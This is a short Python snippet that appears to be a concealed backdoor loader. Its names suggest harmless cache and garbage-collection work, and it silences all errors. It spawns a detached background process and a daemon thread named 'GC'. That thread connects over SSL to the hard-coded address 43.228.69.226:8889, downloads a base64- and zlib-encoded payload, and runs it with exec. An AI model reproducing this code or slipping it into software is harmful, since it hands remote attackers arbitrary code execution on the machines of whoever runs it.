try:
    import os
    import subprocess
    import sys
    import tempfile
    import time
    import threading

    p_tmp_file = os.path.join(tempfile.gettempdir(), 'python_pyc_cache')
    p_clone = True
    if os.path.exists(p_tmp_file) and 'python_pyc_cache' not in globals():
        modification_time = os.path.getmtime(p_tmp_file)
        current_time = time.time()
        time_difference = current_time - modification_time
        if time_difference < 30:
            p_clone = False
        else:
            open(p_tmp_file, 'w').close()
    else:
        open(p_tmp_file, 'w').close()
    if p_clone:
        py_run = exec


        def p_john_run(t):
            while t.is_alive():
                open(p_tmp_file, 'w').close()
                t.join(10)


        command = '{0} -c "python_pyc_cache=1;import socket;import time;time.sleep(10000000)"'.format(sys.executable)
        try:
            import msvcrt

            subprocess.Popen(command, shell=True, creationflags=134218256)
        except:
            cmd = f'nohup {command} > /dev/null 2>&1 &'
            os.system(cmd)

        main_thread = threading.Thread(target=lambda: [
            py_run("""
try:
    import zlib, base64, ssl, socket, struct, time, warnings

    warnings.filterwarnings("ignore", category=DeprecationWarning)
    function = exec
    time.sleep(5)

    for x in range(10):
        try:
            so = socket.socket(2, 1)
            so.connect(('43.228.69.226', 8889))
            s = ssl.wrap_socket(so)
            break
        except:
            time.sleep(5)
    cb = s.recv(4)
    l = struct.unpack('>I', cb)[0]
    d = s.recv(l)
    while len(d) < l:
        bl = l - len(d)
        d += s.recv(bl)
    d = base64.b64decode(d)
    function(zlib.decompress(d), {'s': s})
except:
    pass
                    """)
        ], name='GC', daemon=True)
        main_thread.start()
        threading.Thread(target=p_john_run, name='daemon-thread-1', daemon=True, args=[main_thread]).start()
        if 'python_pyc_cache' in globals():
            del globals()['python_pyc_cache']
except:
    pass
